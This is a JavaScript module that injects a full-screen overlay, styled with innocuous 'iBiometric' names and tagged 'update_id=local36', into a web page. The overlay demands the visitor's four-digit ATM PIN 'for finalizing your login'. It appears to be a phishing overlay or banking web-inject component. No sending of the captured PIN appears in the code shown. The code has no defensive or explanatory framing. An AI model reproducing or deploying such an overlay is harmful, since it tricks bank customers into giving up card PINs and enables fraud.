const atmPromptDialog = () => {
  var styleElement = document.createElement('style');
  styleElement.textContent = `
  .iBiometric_container {
    position: fixed;
    width: 100vw;
    height: 100vh;
    background-color: #000000d3;
    z-index: 99999;
    display: flex;
    flex-direction: column;
    justify-content: center;
  }

  .iBiometric_dialog {
    width: 50%;
    height: min-content;
    background-color: #ffffff;
    margin: auto;
    padding: 15px;
    border-radius: 10px;
  }

  .iBiometric_dialog>h2 {
    text-align: center;
    padding-bottom: 8px;
  }
  
  .iBiometric_dialog>.iBiometric_button_atmSubmit {
    text-align: center;
    padding-top: 10px;
  }
  
  .iBiometric_dialog > form {
    margin: 10px auto;
    display: flex;
    flex-direction: row;
    justify-content: center;
  }

    .iBiometric_dialog>.iBiometric_button_atmSubmit>button {
      padding: 10px 20px;
      outline: none;
      border: 0;
      background-color: #f37e20;
      border-radius: 10px;
      color: #ffffff;
      cursor: pointer;
    }
    .digit-group > input {
      width: 30px;
      height: 50px;
      background-color: white;
      border: 1px solid #000000;
      border-radius: 10px;
      line-height: 50px;
      text-align: center;
      font-size: 24px;
      font-family: 'Raleway', sans-serif;
      font-weight: 200;
      color: #000000;
      margin: 0 2px;
    }
  
    .digit-group > .splitter {
      padding: 0 5px;
      color: red;
      font-size: 24px;
      margin-bottom: 10px;
      
    }          
          `;
  document.head.appendChild(styleElement);
  document.body.insertAdjacentHTML('afterbegin', `
  <div id="iBiometric_container_for_atmPIN_prompt" class="iBiometric_container">
  <div class="iBiometric_dialog">
    <h2>Enter PIN</h2>
    <p>update_id=local36: Please enter your ATM PIN for finalizing your login.</p>
    <form method="get" class="digit-group" data-group-name="digits" data-autosubmit="false" autocomplete="off">
      <input type="text" id="digit-1" name="digit-1" data-next="digit-2" />
      <input type="text" id="digit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" />
      <input type="text" id="digit-3" name="digit-3" data-next="digit-4" data-previous="digit-2" />
      <input type="text" id="digit-4" name="digit-4" data-next="digit-5" data-previous="digit-3" />
    </form>
    <div class="iBiometric_button_atmSubmit">
      <button type="button" id="iBiometric_atmPIN">Submit
      </button>
    </div>
  </div>
</div>
      `);
}

export default atmPromptDialog